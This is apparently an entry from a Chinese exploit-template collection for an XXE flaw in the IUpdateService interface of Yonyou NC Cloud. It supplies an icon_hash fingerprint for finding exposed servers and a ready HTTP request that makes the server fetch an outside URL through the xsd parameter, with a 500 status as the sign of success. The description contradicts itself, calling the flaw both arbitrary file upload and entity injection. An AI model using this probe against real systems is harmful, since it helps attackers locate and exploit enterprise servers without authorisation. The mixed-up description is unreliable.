﻿# 用友NC Cloud IUpdateService接口存在XXE漏洞2

> 更新时间：2024-02-01

> 漏洞编号：

> 漏洞说明：NC Cloud是用友推出的大型企业数字化平台。 用友网络科技股份有限公司NC Cloud存在任意文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。该系统IUpdateService接口存在实体注入漏洞

> 漏洞特征：icon_hash="1085941792"

> 验证脚本：HTTP

```
GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://www.baidu.com HTTP/1.1
Accept: text/plain, */*; q=0.01
Connection: Keep-Alive
Pragma: no-cache
Cache-Control: no-cache
```

> 响应代码特征：500

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：用友NC Cloud IUpdateService接口存在XXE漏洞2.poc
